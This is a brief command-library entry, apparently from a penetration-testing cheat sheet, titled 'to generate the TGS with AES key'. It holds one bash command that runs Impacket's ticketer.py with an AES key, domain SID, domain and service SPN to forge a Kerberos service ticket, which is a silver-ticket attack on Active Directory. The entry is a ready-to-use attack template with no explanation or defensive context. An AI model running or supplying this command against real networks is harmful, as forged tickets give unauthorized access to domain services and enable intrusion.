---
id: 39a5ba87-4fff-4723-a5eb-7509b853a08f
name: to generate the TGS with AES key
type: command
executor: bash
data: 'python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>
  -spn <service_spn> <user_name>

  '
output: null
created_at: '2020-07-14T18:14:48.540152+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# to generate the TGS with AES key

```bash
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>

```
